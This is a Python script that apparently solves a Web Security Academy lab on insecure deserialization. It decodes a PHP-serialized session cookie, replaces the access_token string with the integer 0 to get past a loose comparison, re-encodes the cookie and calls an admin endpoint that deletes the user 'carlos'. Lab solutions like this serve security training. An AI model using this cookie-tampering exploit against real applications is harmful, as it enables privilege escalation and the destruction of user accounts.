from web_security_academy.core.logger import logger
from urllib.parse import quote, unquote
from base64 import b64encode, b64decode

import re


def solve_lab(session):
    session.login("wiener", "peter", with_csrf=False)
    serial = unquote(session.cookies.get("session"))
    serial = b64decode(serial).decode()

    logger.info("Extracted the following serialized object from session cookie:")
    logger.info(serial)

    serial = re.sub(r'"access_token";s:32:".{32}";', '"access_token";i:0;', serial)
    logger.info('Replaced "access_token" value with integer 0:')
    logger.info(serial)

    cookie = b64encode(serial.encode())
    session.cookies.clear_session_cookies()
    session.cookies.set("session", quote(cookie.decode()))
    logger.info("Replaced the session cookie with the modified serialized object")

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
